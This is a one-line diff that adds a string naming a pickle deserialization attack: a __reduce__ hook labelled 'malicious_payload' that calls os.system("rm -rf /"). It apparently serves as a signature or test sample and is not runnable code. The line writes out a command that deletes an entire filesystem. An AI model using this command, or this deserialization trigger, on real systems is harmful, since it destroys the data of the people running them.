@@ -1,0 +1,1 @@
+__reduce__ malicious_payload trigger os.system("rm -rf /")
